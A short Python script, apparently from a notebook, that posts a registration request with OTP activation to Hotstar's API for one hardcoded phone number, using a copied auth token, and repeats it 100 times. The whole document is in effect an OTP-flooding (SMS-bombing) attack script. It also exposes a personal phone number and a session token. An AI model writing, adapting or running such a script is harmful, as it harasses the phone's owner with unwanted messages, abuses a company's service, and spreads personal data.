# %%
import requests

def run():
  headers = {
      'Referer': 'https://www.hotstar.com/',
      'Origin': 'https://www.hotstar.com',
      'hotstarauth': 'st=1558804256~exp=1558810256~acl=/*~hmac=d857f8798d4753e80dcbc937be1ef5386432f640e2532be689cbba19b9ee8287',
      'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.157 Safari/537.36',
      'Content-Type': 'application/json',
  }

  data = '{"userData":{"username":"8112215727","usertype":"phone","deviceId":"6f067dbe-341c-43d5-8a11-4f051eb5cbc3"},"activation":{"mode":"otp"}}'

  response = requests.post('https://api.hotstar.com/in/aadhar/v2/web/in/user/register', headers=headers, data=data)



  
for i in range(100):
  run()
